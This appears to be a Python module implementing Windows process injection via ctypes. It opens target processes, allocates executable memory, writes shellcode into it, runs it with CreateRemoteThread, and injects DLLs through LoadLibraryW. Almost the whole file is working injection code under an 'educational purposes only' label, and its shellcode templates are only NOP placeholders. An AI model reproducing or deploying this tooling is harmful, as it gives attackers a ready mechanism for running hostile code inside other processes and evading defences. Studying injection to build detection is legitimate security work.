"""
Advanced Process Injection Module
Implements CreateRemoteThread for code execution in target processes
For educational and security research purposes only
"""

import ctypes
from ctypes import wintypes
import struct
import logging
from typing import Optional, Callable

logger = logging.getLogger(__name__)

# Additional Windows API constants for thread injection
PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400

# Memory allocation types
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000

# Memory protection constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04

# Thread constants
INFINITE = 0xFFFFFFFF


class ProcessInjector:
    """Handles advanced process manipulation including remote thread creation"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
        # Define function signatures
        self.OpenProcess = self.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.OpenProcess.restype = wintypes.HANDLE
        
        self.VirtualAllocEx = self.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_size_t,
            wintypes.DWORD,
            wintypes.DWORD
        ]
        self.VirtualAllocEx.restype = wintypes.LPVOID
        
        self.VirtualFreeEx = self.kernel32.VirtualFreeEx
        self.VirtualFreeEx.argtypes = [
            wintypes.HANDLE,
            wintypes.LPVOID,
            ctypes.c_size_t,
            wintypes.DWORD
        ]
        self.VirtualFreeEx.restype = wintypes.BOOL
        
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [
            wintypes.HANDLE,
            wintypes.LPVOID,
            wintypes.LPCVOID,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t)
        ]
        self.WriteProcessMemory.restype = wintypes.BOOL
        
        self.ReadProcessMemory = self.kernel32.ReadProcessMemory
        self.ReadProcessMemory.argtypes = [
            wintypes.HANDLE,
            wintypes.LPCVOID,
            wintypes.LPVOID,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t)
        ]
        self.ReadProcessMemory.restype = wintypes.BOOL
        
        self.CreateRemoteThread = self.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [
            wintypes.HANDLE,  # hProcess
            wintypes.LPVOID,  # lpThreadAttributes
            ctypes.c_size_t,  # dwStackSize
            wintypes.LPVOID,  # lpStartAddress
            wintypes.LPVOID,  # lpParameter
            wintypes.DWORD,   # dwCreationFlags
            ctypes.POINTER(wintypes.DWORD)  # lpThreadId
        ]
        self.CreateRemoteThread.restype = wintypes.HANDLE
        
        self.WaitForSingleObject = self.kernel32.WaitForSingleObject
        self.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
        self.WaitForSingleObject.restype = wintypes.DWORD
        
        self.GetExitCodeThread = self.kernel32.GetExitCodeThread
        self.GetExitCodeThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
        self.GetExitCodeThread.restype = wintypes.BOOL
        
        self.CloseHandle = self.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wintypes.HANDLE]
        self.CloseHandle.restype = wintypes.BOOL
        
        self.GetProcAddress = self.kernel32.GetProcAddress
        self.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        self.GetProcAddress.restype = wintypes.LPVOID
        
        self.GetModuleHandleW = self.kernel32.GetModuleHandleW
        self.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
        self.GetModuleHandleW.restype = wintypes.HMODULE
    
    def open_process_for_injection(self, pid: int) -> Optional[wintypes.HANDLE]:
        """Open process with all required permissions for injection"""
        access = (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
                 PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION)
        
        handle = self.OpenProcess(access, False, pid)
        if not handle or handle == -1:
            logger.error(f"Failed to open process {pid} for injection")
            return None
        
        logger.info(f"Opened process {pid} with injection permissions")
        return handle
    
    def allocate_remote_memory(self, process_handle: wintypes.HANDLE, 
                               size: int, 
                               executable: bool = False) -> Optional[int]:
        """Allocate memory in remote process"""
        protection = PAGE_EXECUTE_READWRITE if executable else PAGE_READWRITE
        
        address = self.VirtualAllocEx(
            process_handle,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            protection
        )
        
        if not address:
            logger.error(f"Failed to allocate {size} bytes in remote process")
            return None
        
        logger.info(f"Allocated {size} bytes at {hex(address)} in remote process")
        return address
    
    def free_remote_memory(self, process_handle: wintypes.HANDLE, address: int) -> bool:
        """Free allocated memory in remote process"""
        success = self.VirtualFreeEx(process_handle, address, 0, MEM_RELEASE)
        if success:
            logger.info(f"Freed remote memory at {hex(address)}")
        else:
            logger.error(f"Failed to free remote memory at {hex(address)}")
        return bool(success)
    
    def write_remote_memory(self, process_handle: wintypes.HANDLE, 
                           address: int, data: bytes) -> bool:
        """Write data to remote process memory"""
        bytes_written = ctypes.c_size_t(0)
        buffer = ctypes.create_string_buffer(data)
        
        success = self.WriteProcessMemory(
            process_handle,
            address,
            buffer,
            len(data),
            ctypes.byref(bytes_written)
        )
        
        if success and bytes_written.value == len(data):
            logger.info(f"Wrote {len(data)} bytes to {hex(address)} in remote process")
            return True
        else:
            logger.error(f"Failed to write to remote process at {hex(address)}")
            return False
    
    def read_remote_memory(self, process_handle: wintypes.HANDLE,
                          address: int, size: int) -> Optional[bytes]:
        """Read data from remote process memory"""
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        
        success = self.ReadProcessMemory(
            process_handle,
            address,
            buffer,
            size,
            ctypes.byref(bytes_read)
        )
        
        if success and bytes_read.value == size:
            return buffer.raw
        else:
            logger.error(f"Failed to read from remote process at {hex(address)}")
            return None
    
    def create_remote_thread(self, process_handle: wintypes.HANDLE,
                            start_address: int, 
                            parameter: Optional[int] = None,
                            wait: bool = True,
                            timeout_ms: int = 5000) -> Optional[int]:
        """
        Create and execute a thread in the remote process
        
        Args:
            process_handle: Handle to target process
            start_address: Address of function to execute
            parameter: Optional parameter to pass to the function
            wait: Whether to wait for thread completion
            timeout_ms: Timeout in milliseconds if waiting
            
        Returns:
            Thread exit code if wait=True, thread handle if wait=False
        """
        thread_id = wintypes.DWORD(0)
        param_ptr = parameter if parameter else 0
        
        thread_handle = self.CreateRemoteThread(
            process_handle,
            None,  # Default security attributes
            0,     # Default stack size
            start_address,
            param_ptr,
            0,     # Run immediately
            ctypes.byref(thread_id)
        )
        
        if not thread_handle or thread_handle == -1:
            logger.error("Failed to create remote thread")
            return None
        
        logger.info(f"Created remote thread with ID {thread_id.value}")
        
        if wait:
            # Wait for thread to complete
            wait_result = self.WaitForSingleObject(thread_handle, timeout_ms)
            
            if wait_result == 0:  # WAIT_OBJECT_0
                exit_code = wintypes.DWORD(0)
                if self.GetExitCodeThread(thread_handle, ctypes.byref(exit_code)):
                    logger.info(f"Remote thread exited with code {exit_code.value}")
                    self.CloseHandle(thread_handle)
                    return exit_code.value
                else:
                    logger.error("Failed to get thread exit code")
            else:
                logger.error(f"Thread wait failed or timed out (result: {wait_result})")
            
            self.CloseHandle(thread_handle)
            return None
        else:
            return thread_handle
    
    def inject_shellcode(self, pid: int, shellcode: bytes, 
                         parameter: Optional[int] = None) -> Optional[int]:
        """
        Inject and execute shellcode in target process
        
        Args:
            pid: Target process ID
            shellcode: Machine code to execute
            parameter: Optional parameter to pass to shellcode
            
        Returns:
            Thread exit code or None on failure
        """
        process_handle = self.open_process_for_injection(pid)
        if not process_handle:
            return None
        
        try:
            # Allocate executable memory
            remote_address = self.allocate_remote_memory(
                process_handle, 
                len(shellcode), 
                executable=True
            )
            if not remote_address:
                return None
            
            # Write shellcode to remote process
            if not self.write_remote_memory(process_handle, remote_address, shellcode):
                self.free_remote_memory(process_handle, remote_address)
                return None
            
            # Execute shellcode in remote thread
            exit_code = self.create_remote_thread(
                process_handle,
                remote_address,
                parameter,
                wait=True
            )
            
            # Cleanup
            self.free_remote_memory(process_handle, remote_address)
            
            return exit_code
            
        finally:
            self.CloseHandle(process_handle)
    
    def call_remote_function(self, pid: int, dll_name: str, 
                            function_name: str, parameter: Optional[int] = None) -> Optional[int]:
        """
        Call a function from a DLL loaded in the target process
        
        Args:
            pid: Target process ID
            dll_name: Name of DLL (e.g., "kernel32.dll")
            function_name: Name of function to call
            parameter: Optional parameter to pass
            
        Returns:
            Function return value or None on failure
        """
        # Get function address in our process (should be same in target due to ASLR)
        module_handle = self.GetModuleHandleW(dll_name)
        if not module_handle:
            logger.error(f"Failed to get handle for {dll_name}")
            return None
        
        function_address = self.GetProcAddress(module_handle, function_name.encode('ascii'))
        if not function_address:
            logger.error(f"Failed to get address for {function_name} in {dll_name}")
            return None
        
        logger.info(f"Found {function_name} at {hex(function_address)}")
        
        # Open target process and create remote thread
        process_handle = self.open_process_for_injection(pid)
        if not process_handle:
            return None
        
        try:
            exit_code = self.create_remote_thread(
                process_handle,
                function_address,
                parameter,
                wait=True
            )
            return exit_code
        finally:
            self.CloseHandle(process_handle)
    
    def inject_dll(self, pid: int, dll_path: str) -> bool:
        """
        Inject a DLL into target process using LoadLibrary
        
        Args:
            pid: Target process ID
            dll_path: Full path to DLL to inject
            
        Returns:
            True if successful, False otherwise
        """
        # Get LoadLibraryW address
        kernel32_handle = self.GetModuleHandleW("kernel32.dll")
        if not kernel32_handle:
            logger.error("Failed to get kernel32.dll handle")
            return False
        
        load_library_addr = self.GetProcAddress(kernel32_handle, b"LoadLibraryW")
        if not load_library_addr:
            logger.error("Failed to get LoadLibraryW address")
            return False
        
        # Open target process
        process_handle = self.open_process_for_injection(pid)
        if not process_handle:
            return False
        
        try:
            # Encode DLL path as wide string
            dll_path_bytes = (dll_path + '\0').encode('utf-16le')
            
            # Allocate memory for DLL path
            remote_path = self.allocate_remote_memory(
                process_handle,
                len(dll_path_bytes),
                executable=False
            )
            if not remote_path:
                return False
            
            # Write DLL path to remote process
            if not self.write_remote_memory(process_handle, remote_path, dll_path_bytes):
                self.free_remote_memory(process_handle, remote_path)
                return False
            
            # Call LoadLibraryW in remote process
            result = self.create_remote_thread(
                process_handle,
                load_library_addr,
                remote_path,
                wait=True
            )
            
            # Cleanup
            self.free_remote_memory(process_handle, remote_path)
            
            if result and result != 0:
                logger.info(f"Successfully injected DLL: {dll_path}")
                return True
            else:
                logger.error(f"Failed to inject DLL: {dll_path}")
                return False
                
        finally:
            self.CloseHandle(process_handle)


# Example shellcode templates (x64)
class ShellcodeTemplates:
    """Pre-built shellcode templates for common operations"""
    
    @staticmethod
    def message_box_x64() -> bytes:
        """
        Simple MessageBox shellcode for x64 (proof of concept)
        Displays "Injected!" message
        """
        # This is a simplified example - real shellcode would be more complex
        # NOTE: This is for educational purposes only
        return b"\x90" * 10  # NOP sled placeholder
    
    @staticmethod
    def nop_sled(size: int) -> bytes:
        """Generate NOP sled of specified size"""
        return b"\x90" * size
